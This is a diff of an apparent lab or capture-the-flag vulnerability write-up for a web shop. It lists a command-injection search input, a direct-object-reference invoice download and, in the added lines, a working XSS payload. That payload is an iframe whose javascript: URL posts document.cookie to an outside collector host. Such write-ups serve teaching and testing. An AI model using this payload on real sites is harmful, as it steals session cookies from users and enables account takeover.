@@ -19,6 +19,12 @@ In the purchase history, when inputting in the search the payload : 4 && cd .. &
 
 4. XSS
 Create a number with the payload 
+<iframe src="javascript:fetch('https://en5xeo0nro63l.x.pipedream.net/', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});"></iframe>
+
 
 5. Direct object reference 
 For this one, just download the invoice number 7 
